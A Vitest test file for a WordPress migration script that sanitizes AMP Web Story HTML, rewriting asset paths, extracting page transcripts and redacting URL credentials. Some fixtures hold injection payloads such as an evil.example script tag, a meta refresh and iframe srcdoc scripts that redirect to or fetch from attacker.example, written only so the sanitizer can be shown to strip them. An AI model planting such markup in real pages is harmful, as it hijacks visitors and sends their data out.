import { describe, expect, it } from 'vitest';

import { makeStoryAssetsBasePortable } from '../../scripts/migrate-wordpress/html.js';
import { analyzeStoryHtml } from '../../scripts/migrate-wordpress/transform/index.js';

const REMOTE_IMAGE =
  'https://images.unsplash.com/photo-1586125674857-4eb86880905d?fm=jpg&w=3456';
const REMOTE_VIDEO =
  'https://storage.coverr.co/videos/oBD009YsqLVNNAznoMRGAVCZZkxJNnve4?quality=legacy';
const TEST_ORIGIN = '192.0.2.1';

describe('Story AMP HTML analysis', () => {
  it('preserves a configured local publisher logo for portable deployment', () => {
    const html = `<!doctype html>
<html amp lang="zh-Hant">
  <head><title>可攜式 Story</title></head>
  <body>
    <amp-story standalone title="可攜式 Story" publisher="數位引擎">
      <amp-story-page id="page-one">
        <amp-story-grid-layer template="vertical"><p>第一頁</p></amp-story-grid-layer>
      </amp-story-page>
    </amp-story>
  </body>
</html>`;

    const result = analyzeStoryHtml(html, {
      publisherLogoUrl: '/wp-content/uploads/2020/10/logo.png',
      slug: 'portable-story',
    });
    const portable = makeStoryAssetsBasePortable(result.normalizedHtml);

    expect(result.normalizedHtml).toContain(
      'publisher-logo-src="/wp-content/uploads/2020/10/logo.png"',
    );
    expect(portable).toContain(
      'publisher-logo-src="../../wp-content/uploads/2020/10/logo.png"',
    );
  });

  it('keeps Story assets inside the deployed site base path', () => {
    const html = `
      <amp-img src="/wp-content/uploads/2020/01/local.jpg"></amp-img>
      <amp-video poster="/story-media/poster.jpg"></amp-video>
      <link rel="icon" href="/favicon.svg">
      <a href="/">首頁</a>
      <a href="https://example.com/wp-content/uploads/external.jpg">外部圖片</a>
      <amp-img src="../../wp-content/uploads/already-portable.jpg"></amp-img>
    `;

    const portable = makeStoryAssetsBasePortable(html);

    expect(portable).toContain(
      'src="../../wp-content/uploads/2020/01/local.jpg"',
    );
    expect(portable).toContain('poster="../../story-media/poster.jpg"');
    expect(portable).toContain('href="../../favicon.svg"');
    expect(portable).toContain('href="../../"');
    expect(portable).toContain(
      'href="https://example.com/wp-content/uploads/external.jpg"',
    );
    expect(portable).toContain(
      'src="../../wp-content/uploads/already-portable.jpg"',
    );
    expect(portable).not.toContain('../../../wp-content');
  });

  it('extracts pages, transcript, links, and exact remote assets', () => {
    const html = `<!doctype html>
<html amp lang="en">
  <head>
    <title>測試 Story</title>
    <script async src="https://cdn.ampproject.org/v0.js"></script>
    <script src="https://evil.example/script.js"></script>
    <link rel="canonical" href="https://www.darrenhuang.com/web-stories/test-story">
  </head>
  <body onload="evil()">
    <amp-story standalone title="測試 Story" publisher="數位引擎" publisher-logo-src="https://www.darrenhuang.com/wp-content/plugins/web-stories/fallback.png" poster-portrait-src="https://www.darrenhuang.com/wp-content/uploads/2020/01/poster.jpg">
      <amp-story-page id="page-one" auto-advance-after="7s">
        <amp-story-grid-layer template="fill">
          <amp-img src="http://${TEST_ORIGIN}/wp-content/uploads/2020/01/local.jpg"></amp-img>
          <p>第一頁文字</p>
        </amp-story-grid-layer>
      </amp-story-page>
      <amp-story-page id="page-two">
        <amp-story-grid-layer template="vertical">
          <amp-img src="${REMOTE_IMAGE}"></amp-img>
          <amp-video poster="https://storage.coverr.co/p/poster"><source src="${REMOTE_VIDEO}" type="video/mp4"></amp-video>
          <p><span>第二頁</span>文字</p>
          <a href="https://www.darrenhuang.com/about-darren-huang">閱讀更多</a>
        </amp-story-grid-layer>
      </amp-story-page>
    </amp-story>
  </body>
</html>`;

    const result = analyzeStoryHtml(html, {
      internalHosts: [TEST_ORIGIN],
      slug: 'test-story',
    });

    expect(result.pageCount).toBe(2);
    expect(result.pages[0]).toMatchObject({
      autoAdvanceAfter: '7s',
      id: 'page-one',
      index: 1,
      transcript: ['第一頁文字'],
    });
    expect(result.pages[1]?.transcript).toEqual(['第二頁文字', '閱讀更多']);
    expect(result.pages[1]?.links).toEqual(['/about-darren-huang']);
    expect(result.assets).toContainEqual(
      expect.objectContaining({
        external: true,
        kind: 'image',
        sourceUrl: REMOTE_IMAGE,
        rewrittenUrl: REMOTE_IMAGE,
      }),
    );
    expect(result.assets).toContainEqual(
      expect.objectContaining({
        external: true,
        kind: 'video',
        sourceUrl: REMOTE_VIDEO,
        rewrittenUrl: REMOTE_VIDEO,
      }),
    );
    expect(result.normalizedHtml).toContain('lang="zh-Hant"');
    expect(result.normalizedHtml).toContain(
      'href="https://www.darrenhuang.com/web-stories/test-story/"',
    );
    expect(result.normalizedHtml).toContain(
      'publisher-logo-src="https://www.darrenhuang.com/wp-content/uploads/2020/10/%E6%95%B8%E4%BD%8D%E5%BC%95%E6%93%8E-logo.png"',
    );
    expect(result.normalizedHtml).toContain(
      'src="/wp-content/uploads/2020/01/local.jpg"',
    );
    expect(result.normalizedHtml).toContain('https://cdn.ampproject.org/v0.js');
    expect(result.normalizedHtml).not.toContain('evil.example');
    expect(result.normalizedHtml).not.toContain('onload');
  });

  it('removes active nested documents from Story HTML', () => {
    const html = `<!doctype html>
<html amp>
  <head>
    <title>不可信 Story</title>
    <base href="https://attacker.example/">
    <meta http-equiv="refresh" content="0; url=https://attacker.example/redirect">
  </head>
  <body>
    <amp-story standalone title="不可信 Story" publisher="數位引擎">
      <amp-story-page id="page-one">
        <amp-story-grid-layer template="vertical">
          <p>仍應保留的 Story 文字</p>
          <iframe src="https://attacker.example/frame" srcdoc="&lt;script&gt;window.top.location='https://attacker.example/'&lt;/script&gt;"></iframe>
          <amp-iframe srcdoc="&lt;script&gt;fetch('https://attacker.example/collect')&lt;/script&gt;"></amp-iframe>
          <object data="https://attacker.example/plugin"><p>object fallback</p></object>
          <embed src="https://attacker.example/plugin">
        </amp-story-grid-layer>
      </amp-story-page>
    </amp-story>
  </body>
</html>`;

    const result = analyzeStoryHtml(html, { slug: 'untrusted-story' });

    expect(result.pageCount).toBe(1);
    expect(result.transcript).toEqual(['仍應保留的 Story 文字']);
    expect(result.normalizedHtml).not.toMatch(
      /<(?:base|embed|iframe|object)\b/i,
    );
    expect(result.normalizedHtml).not.toMatch(/\bsrcdoc\s*=/i);
    expect(result.normalizedHtml).not.toMatch(
      /<meta\b[^>]*http-equiv=["']?refresh/i,
    );
    expect(result.normalizedHtml).not.toContain('attacker.example');
    expect(result.warnings).toContain(
      'Removed active nested content from Story HTML.',
    );
    expect(result.warnings).toContain(
      'Removed navigation-affecting markup from Story HTML.',
    );
  });

  it('collects every AMP Story asset-bearing attribute used by the site', () => {
    const html = `<!doctype html>
<html amp>
  <head><title>資產 Story</title></head>
  <body>
    <amp-story standalone title="資產 Story" publisher="數位引擎"
      publisher-logo-src="/wp-content/uploads/logo.png"
      entity-logo-src="/wp-content/uploads/entity.png"
      poster-portrait-src="/wp-content/uploads/portrait.jpg"
      poster-square-src="/wp-content/uploads/square.jpg"
      poster-landscape-src="/wp-content/uploads/landscape.jpg"
      background-audio="/wp-content/uploads/story.mp3">
      <amp-story-page id="page-one" background-audio="/wp-content/uploads/page.mp3">
        <amp-story-grid-layer template="vertical">
          <a href="/" data-tooltip-icon="/wp-content/uploads/tooltip.png">首頁</a>
          <amp-video src="/wp-content/uploads/movie.mp4"
            poster="/wp-content/uploads/poster.jpg"
            artwork="/wp-content/uploads/artwork.jpg"></amp-video>
        </amp-story-grid-layer>
      </amp-story-page>
    </amp-story>
  </body>
</html>`;

    const result = analyzeStoryHtml(html, {
      publisherLogoUrl: '/wp-content/uploads/logo.png',
      slug: 'asset-story',
    });
    const attributes = result.assets.map((asset) => asset.attribute);

    expect(attributes).toEqual(
      expect.arrayContaining([
        'artwork',
        'background-audio',
        'data-tooltip-icon',
        'entity-logo-src',
        'poster',
        'poster-landscape-src',
        'poster-portrait-src',
        'poster-square-src',
        'publisher-logo-src',
        'src',
      ]),
    );
    expect(result.assets).toContainEqual(
      expect.objectContaining({
        attribute: 'data-tooltip-icon',
        kind: 'image',
        rewrittenUrl: '/wp-content/uploads/tooltip.png',
      }),
    );
    expect(result.assets).toContainEqual(
      expect.objectContaining({
        attribute: 'artwork',
        kind: 'poster',
        rewrittenUrl: '/wp-content/uploads/artwork.jpg',
      }),
    );
  });

  it('analyzes legacy Story fragments and expands the title placeholder', () => {
    const fragment = `
<amp-story-page id="legacy-one">
  <amp-story-grid-layer template="vertical">
    <h1><amp-fit-text>{content}</amp-fit-text></h1>
    <img src="https://www.darrenhuang.com/wp-content/uploads/2019/07/legacy.png">
  </amp-story-grid-layer>
</amp-story-page>`;

    const result = analyzeStoryHtml(fragment, {
      slug: 'legacy-story',
      title: '舊版故事標題',
    });

    expect(result.pageCount).toBe(1);
    expect(result.pages[0]?.transcript).toEqual(['舊版故事標題']);
    expect(result.pages[0]?.assets[0]).toMatchObject({
      external: false,
      rewrittenUrl: '/wp-content/uploads/2019/07/legacy.png',
    });
    expect(result.warnings).toContainEqual(
      expect.stringContaining('HTML fragment'),
    );
  });

  it('redacts Story URL credentials before emitting HTML or reports', () => {
    const apiKey = 'A'.repeat(31);
    const signature = 'B'.repeat(48);
    const keyPairId = 'C'.repeat(20);
    const accessToken = 'D'.repeat(32);
    const html = `<!doctype html>
<html amp>
  <head><title>安全 Story</title></head>
  <body>
    <amp-story standalone title="安全 Story" publisher="數位引擎">
      <amp-story-page id="page-one">
        <amp-story-grid-layer template="vertical">
          <amp-img src="https://media.example.com/main.jpg?api_key=${apiKey}" srcset="https://media.example.com/large.jpg?Signature=${signature}&amp;Key-Pair-Id=${keyPairId} 2x"></amp-img>
          <a href="/read?keep=1&amp;Signature=${signature}">閱讀</a>
          <amp-video poster="/poster.jpg?access_token=${accessToken}"></amp-video>
          <p data-api-key="${apiKey}">apikey="${apiKey}"</p>
          <p>{"apiKey":"${apiKey}","access_token":"${accessToken}"}</p>
        </amp-story-grid-layer>
      </amp-story-page>
    </amp-story>
  </body>
</html>`;

    const result = analyzeStoryHtml(html, {
      publisherLogoUrl: '/wp-content/uploads/2020/10/logo.png',
      slug: 'safe-story',
    });
    const serialized = JSON.stringify(result);

    expect(serialized).not.toContain(apiKey);
    expect(serialized).not.toContain(signature);
    expect(serialized).not.toContain(keyPairId);
    expect(serialized).not.toContain(accessToken);
    expect(serialized).not.toContain('access_token=');
    expect(serialized).not.toContain('Signature=');
    expect(serialized).not.toContain('Key-Pair-Id=');
    expect(result.normalizedHtml).toContain('api_key=REDACTED');
    expect(result.normalizedHtml).toContain('data-api-key="REDACTED"');
    expect(result.transcript).toContain('apikey="REDACTED"');
    expect(result.links).toContain('/read?keep=1');
  });
});
